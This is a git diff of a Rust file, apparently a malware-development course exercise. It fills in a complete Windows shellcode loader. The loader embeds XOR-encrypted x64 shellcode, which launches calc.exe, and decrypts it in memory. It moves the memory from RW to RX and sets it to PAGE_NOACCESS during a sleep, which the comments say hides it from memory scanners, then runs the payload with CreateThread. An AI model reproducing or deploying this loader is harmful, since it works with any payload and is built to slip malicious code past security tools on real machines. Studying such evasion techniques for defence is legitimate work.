@@ -1,5 +1,5 @@
 use std::mem::transmute;
-use std::ptr;
+use std::{ptr};
 use windows::Win32::Foundation::GetLastError;
 use windows::Win32::System::Memory::{
     MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READ, PAGE_NOACCESS, PAGE_PROTECTION_FLAGS,
@@ -9,25 +9,60 @@ use windows::Win32::System::Threading::{
     CreateThread, INFINITE, Sleep, THREAD_CREATION_FLAGS, WaitForSingleObject,
 };
 
+
 const KEY: u8 = 0x4b;
 
 // Technique 1 & 2: shellcode is stored XOR-encrypted.
 // To generate: take the raw bytes from Module 01 and XOR each with KEY.
 // The const fn below does this at compile time if you pass the plaintext bytes.
 const fn xor_bytes<const N: usize>(data: &[u8; N], key: u8) -> [u8; N] {
-    todo!() // implement: XOR each byte with key, return new array
-            // Hint: use `while`, not `for` — const fn cannot use iterator methods
+    let mut counter = 0;
+    let mut data_out = [0u8; N];
+    while counter < N {
+        data_out[counter] = data[counter] ^ key;
+        counter += 1;
+    }
+    data_out
 }
 
-// Replace with the XOR-encrypted version of your Module 01 shellcode.
-// Generate with: bytes.iter().map(|b| b ^ KEY).collect::<Vec<_>>()
-// Or use xor_bytes() const fn above if you have the raw bytes as a const.
-const SHELLCODE_ENC: &[u8] = &[/* encrypted bytes here */];
+const SHELLCODE_PLAIN: [u8; 276] = [0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xc0,
+0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,0x51,0x56,0x48,0x31,
+0xd2,0x65,0x48,0x8b,0x52,0x60,0x48,0x8b,0x52,0x18,0x48,0x8b,
+0x52,0x20,0x48,0x8b,0x72,0x50,0x48,0x0f,0xb7,0x4a,0x4a,0x4d,
+0x31,0xc9,0x48,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,
+0x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,0xe2,0xed,0x52,0x41,0x51,
+0x48,0x8b,0x52,0x20,0x8b,0x42,0x3c,0x48,0x01,0xd0,0x8b,0x80,
+0x88,0x00,0x00,0x00,0x48,0x85,0xc0,0x74,0x67,0x48,0x01,0xd0,
+0x50,0x8b,0x48,0x18,0x44,0x8b,0x40,0x20,0x49,0x01,0xd0,0xe3,
+0x56,0x48,0xff,0xc9,0x41,0x8b,0x34,0x88,0x48,0x01,0xd6,0x4d,
+0x31,0xc9,0x48,0x31,0xc0,0xac,0x41,0xc1,0xc9,0x0d,0x41,0x01,
+0xc1,0x38,0xe0,0x75,0xf1,0x4c,0x03,0x4c,0x24,0x08,0x45,0x39,
+0xd1,0x75,0xd8,0x58,0x44,0x8b,0x40,0x24,0x49,0x01,0xd0,0x66,
+0x41,0x8b,0x0c,0x48,0x44,0x8b,0x40,0x1c,0x49,0x01,0xd0,0x41,
+0x8b,0x04,0x88,0x48,0x01,0xd0,0x41,0x58,0x41,0x58,0x5e,0x59,
+0x5a,0x41,0x58,0x41,0x59,0x41,0x5a,0x48,0x83,0xec,0x20,0x41,
+0x52,0xff,0xe0,0x58,0x41,0x59,0x5a,0x48,0x8b,0x12,0xe9,0x57,
+0xff,0xff,0xff,0x5d,0x48,0xba,0x01,0x00,0x00,0x00,0x00,0x00,
+0x00,0x00,0x48,0x8d,0x8d,0x01,0x01,0x00,0x00,0x41,0xba,0x31,
+0x8b,0x6f,0x87,0xff,0xd5,0xbb,0xf0,0xb5,0xa2,0x56,0x41,0xba,
+0xa6,0x95,0xbd,0x9d,0xff,0xd5,0x48,0x83,0xc4,0x28,0x3c,0x06,
+0x7c,0x0a,0x80,0xfb,0xe0,0x75,0x05,0xbb,0x47,0x13,0x72,0x6f,
+0x6a,0x00,0x59,0x41,0x89,0xda,0xff,0xd5,0x63,0x61,0x6c,0x63,
+0x2e,0x65,0x78,0x65,0x00];
+
+const SHELLCODE_ENC_ARR: [u8; 276] = xor_bytes(&SHELLCODE_PLAIN, KEY);
+const SHELLCODE_ENC: &[u8] = &SHELLCODE_ENC_ARR;
 
 fn main() {
     unsafe {
         // Step 1 — Allocate RW memory (same as Module 01).
-        let base = todo!("VirtualAlloc: RW region for shellcode");
+        let base = VirtualAlloc(
+            None, // let OS choose base
+            SHELLCODE_ENC.len(), // lallocate enough space for shellcode
+            MEM_COMMIT | MEM_RESERVE, // reservce space and commit it to make usable
+            PAGE_READWRITE // rw
+        );
+
         if base.is_null() {
             panic!("VirtualAlloc failed: {:?}", GetLastError());
         }
@@ -35,12 +70,26 @@ fn main() {
         // Step 2 — Copy SHELLCODE_ENC into the allocation and decrypt in place.
         // Hint: ptr::copy_nonoverlapping first, then XOR each byte with KEY.
         // The decrypted shellcode only ever exists in this memory region, never on disk.
-        todo!("copy encrypted shellcode into allocation, then decrypt in place with KEY");
+        ptr::copy_nonoverlapping(
+            SHELLCODE_ENC.as_ptr(), 
+            base as *mut u8, 
+            SHELLCODE_ENC.len()
+        );
+        
+        for i in 0..SHELLCODE_ENC.len() {
+            *(base as *mut u8).add(i) ^= KEY;
+        }
+
 
         // Step 3 — Flip to PAGE_EXECUTE_READ.
         // Hint: VirtualProtect(base, SHELLCODE_ENC.len(), PAGE_EXECUTE_READ, &mut old)
         let mut old: PAGE_PROTECTION_FLAGS = Default::default();
-        todo!("VirtualProtect: PAGE_READWRITE -> PAGE_EXECUTE_READ");
+        VirtualProtect(
+            base, 
+            SHELLCODE_ENC.len(), 
+            PAGE_EXECUTE_READ, 
+            &mut old
+        ).ok().expect("Virtual Protect failed");
 
         // Technique 3: sleep obfuscation.
         // During Sleep, flip the page to PAGE_NOACCESS so memory scanners cannot read it.
@@ -48,16 +97,35 @@ fn main() {
 
         // Step 4 — Flip to PAGE_NOACCESS before sleeping.
         // Hint: VirtualProtect(base, SHELLCODE_ENC.len(), PAGE_NOACCESS, &mut old)
-        todo!("VirtualProtect: PAGE_EXECUTE_READ -> PAGE_NOACCESS");
+        VirtualProtect(
+            base, 
+            SHELLCODE_ENC.len(), 
+            PAGE_NOACCESS, 
+            &mut old
+        ).ok().expect("Virtual Protect failed");
 
         // Step 5 — Sleep. Memory scanners cannot read the page during this window.
-        todo!("Sleep(5000)");
+        Sleep(5000);
 
         // Step 6 — Flip back to PAGE_EXECUTE_READ before executing.
         // Hint: same VirtualProtect call as Step 3, reuse &mut old.
-        todo!("VirtualProtect: PAGE_NOACCESS -> PAGE_EXECUTE_READ");
+        VirtualProtect(
+            base, 
+            SHELLCODE_ENC.len(), 
+            PAGE_EXECUTE_READ, 
+            &mut old
+        ).ok().expect("Virtual Protect failed");
 
         // Step 7 — Execute (same as Module 01: CreateThread + WaitForSingleObject).
-        todo!("CreateThread at base, WaitForSingleObject");
+        let handle = CreateThread(
+            None, 
+            0, 
+            Some(transmute(base)), 
+            None, 
+            THREAD_CREATION_FLAGS(0), 
+            None
+        ).expect("Create Thread failed");
+
+        WaitForSingleObject(handle, INFINITE);
     }
 }
